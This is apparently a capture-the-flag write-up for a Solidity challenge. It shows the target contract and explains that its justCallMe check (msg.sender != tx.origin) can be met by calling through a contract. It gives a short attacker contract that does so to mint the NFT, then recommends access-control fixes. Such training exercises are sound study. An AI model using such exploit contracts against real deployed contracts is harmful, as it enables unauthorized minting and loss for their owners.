# Challenge Overview
- Name: Challenge 2
- Category: Smart Contract Exploitation
- Objective: Mint the NFT associated with Challenge 2.

# Contract Code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface INFTFlags {
    function mint(address _recipient, uint256 _challengeId) external;
}

contract Challenge2 {
    address public nftContract;

    constructor(address _nftContract) {
        nftContract = _nftContract;
    }

    function justCallMe() public {
        require(msg.sender != tx.origin, "Not allowed");
        INFTFlags(nftContract).mint(tx.origin, 2);
    }
}
```


# Vulnerability Analysis

The function justCallMe checks that the caller `msg.sender` is not the transaction origin `tx.origin`. This implies that the function must be called through a contract rather than directly by an EOA (Externally Owned Account). However, there is no additional validation, which makes it exploitable.

# Exploit Execution

To exploit this vulnerability, we can write a simple attacker contract to bypass the require check. By deploying and calling the function through a contract, we can successfully mint the NFT:

```solidity
interface IChallenge2 {
    function justCallMe() external;
}

contract Exploit {
    IChallenge2 public target;

    constructor(address _target) {
        target = IChallenge2(_target);
    }

    function exploit() public {
        target.justCallMe();
    }
}
```

## Execution Steps:
1. Deploy the Exploit contract with the address of the Challenge2 contract.
2. Call the exploit function of the deployed Exploit contract.

This successfully meets the condition of `msg.sender != tx.origin` and mints the NFT.

# Result & Impact

This exploit allows any user to mint an NFT without proper authorization. The lack of proper access control undermines the security of the contract and the exclusivity of the NFT.

# Fix Recommendation

To mitigate this vulnerability, consider:
1. Implementing proper access control using Ownable or a whitelist mechanism.
2. Validating the caller against a list of authorized addresses.
3. Using a more secure authentication mechanism that cannot be bypassed by contracts:

```solidity
require(msg.sender == tx.origin && authorized[msg.sender], "Not allowed");
```

This would ensure that only authorized EOAs can call the function, preventing unauthorized minting.